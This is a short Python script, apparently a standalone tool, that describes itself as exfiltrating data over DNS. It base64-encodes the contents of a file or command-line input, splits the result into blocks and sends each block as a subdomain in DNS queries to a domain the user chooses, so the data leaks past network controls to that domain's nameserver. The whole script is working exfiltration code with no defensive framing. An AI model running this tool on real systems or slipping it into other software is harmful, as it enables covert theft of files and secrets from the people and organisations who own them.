#!/bin/python3
import argparse
import os
import base64
import dns.resolver  # dnspython


def valid_file(filename):
    print('Testing if %s is a file.' % filename)
    if not os.path.exists(filename):
        raise argparse.ArgumentTypeError('The file %s does not exist!' % filename)
    else:
        print('Yes it is.')
        return filename


# argparse to get command-line flags
parser = argparse.ArgumentParser(description='Exfiltrate data using DNS.')
parser.add_argument('--filename', '--file', '-f', '-i', '--input',
                    type=valid_file, help='File to exfiltrate. (default: none)')
parser.add_argument('--blocksize', '-b', '-bs', type=int, choices=range(4, 17), default=12,
                    help='Size of blocks to encode. (default: 12)')
parser.add_argument('--domain', '-d', type=str, default='google.com',
                    help='Domain to use for tunneling. (default: google.com)')
parser.add_argument('--data', type=str,
                    help='Read data from the command line. (default: none)')
parser.add_argument('--type', '-t', type=str, choices=['A', 'TXT'], default='TXT',
                    help='Read data from the command line. (default: TXT)')
args = parser.parse_args()


def main():
    if args.filename:
        # f = open(args.filename, 'r+')
        plaindata = open(args.filename, 'r').read().split('\n')
        # for line in f.readlines():
        fulldata = '\n'.join(plaindata)
    elif args.data:
        fulldata = args.data
    if fulldata:
        encodeddata = base64.b64encode(fulldata.encode('ascii')).decode('ascii')
        encodeddata = encodeddata.replace('=', '')
        sendqueries(encodeddata)


def sendqueries(b64data):
    blocksize = args.blocksize
    domain = args.domain
    type=args.type
    b64array = [b64data[y-blocksize:y] for y in range(blocksize, len(b64data)+blocksize, blocksize)]
    print(len(b64array))
    for word in b64array:
        queryname = word + '.' + domain
        print('\nSending %s' % queryname)
        result = dns.resolver.resolve(queryname, type)
        print(str(result.response))


if __name__ == "__main__":
    main()
